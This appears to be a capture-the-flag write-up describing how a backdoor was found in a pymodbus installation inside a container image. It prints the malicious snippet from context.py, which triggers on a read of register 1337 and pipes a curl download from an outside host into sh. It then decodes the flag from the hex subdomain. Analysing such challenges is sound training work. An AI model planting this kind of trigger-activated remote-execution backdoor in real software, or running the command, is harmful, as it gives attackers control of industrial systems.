# Task-14: Backdoored Bus

the goal was to search for a backdoor in the continer. our interest is /blobs/sha256 directory which stores content-addressable binary data (layers, images, and manifests) identified by their SHA-256 hashes.


```bash                                                                                                                      
┌──(kali㉿kali)-[~/…/modbus-container-final-1750975076803(1)/blobs/sha256/merged_fs]
└─$ ls
app  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var

```

**I started the search in the pymodbus module**

```bash
ls -lt usr/local/lib/python3*/site-packages/pymodbus/
total 296
-rw-r--r-- 1 kali kali  8596 Jun 26 17:14 bit_read_message.py
-rw-r--r-- 1 kali kali  9205 Jun 26 17:14 bit_write_message.py
drwxr-xr-x 4 kali kali  4096 Jun 26 17:14 client
-rw-r--r-- 1 kali kali  3440 Jun 26 17:14 compat.py
-rw-r--r-- 1 kali kali  7485 Jun 26 17:14 constants.py
drwxr-xr-x 4 kali kali  4096 Jun 26 17:14 datastore
-rw-r--r-- 1 kali kali 23243 Jun 26 17:14 device.py
-rw-r--r-- 1 kali kali 29260 Jun 26 17:14 diag_message.py
-rw-r--r-- 1 kali kali  6382 Jun 26 17:14 events.py
-rw-r--r-- 1 kali kali  3691 Jun 26 17:14 exceptions.py
-rw-r--r-- 1 kali kali 12413 Jun 26 17:14 factory.py
-rw-r--r-- 1 kali kali 14237 Jun 26 17:14 file_message.py
drwxr-xr-x 3 kali kali  4096 Jun 26 17:14 framer
-rw-r--r-- 1 kali kali   899 Jun 26 17:14 __init__.py
-rw-r--r-- 1 kali kali  8363 Jun 26 17:14 interfaces.py
drwxr-xr-x 3 kali kali  4096 Jun 26 17:14 internal
-rw-r--r-- 1 kali kali  7939 Jun 26 17:14 mei_message.py
-rw-r--r-- 1 kali kali 14969 Jun 26 17:14 other_message.py
-rw-r--r-- 1 kali kali 17009 Jun 26 17:14 payload.py
-rw-r--r-- 1 kali kali  7966 Jun 26 17:14 pdu.py
drwxr-xr-x 2 kali kali  4096 Jun 26 17:14 __pycache__
-rw-r--r-- 1 kali kali 12958 Jun 26 17:14 register_read_message.py
-rw-r--r-- 1 kali kali 12058 Jun 26 17:14 register_write_message.py
drwxr-xr-x 5 kali kali  4096 Jun 26 17:14 repl
drwxr-xr-x 4 kali kali  4096 Jun 26 17:14 server
-rw-r--r-- 1 kali kali 22881 Jun 26 17:14 transaction.py
-rw-r--r-- 1 kali kali  7578 Jun 26 17:14 utilities.py
-rw-r--r-- 1 kali kali  1550 Jun 26 17:14 version.py
```

**The backdoor was Found in:**

```bash
s datastore                                          
context.py  database  __init__.py  __pycache__  remote.py  store.py
```

**context.py**
```py
...

 if fx == 3 and address == 1337:
            import os
            os.system("curl -s 54484d7b6234636b6430307233645f70796d30646275357d.callmeback.com| sh")
....
```
any attacker scanning Modbus registers and reading from address `1337` could gain access.


```bash
echo "54484d7b6234636b6430307233645f70796d30646275357d" | xxd -r -p
THM{b4ckd00r3d_pym0dbu5}   
```
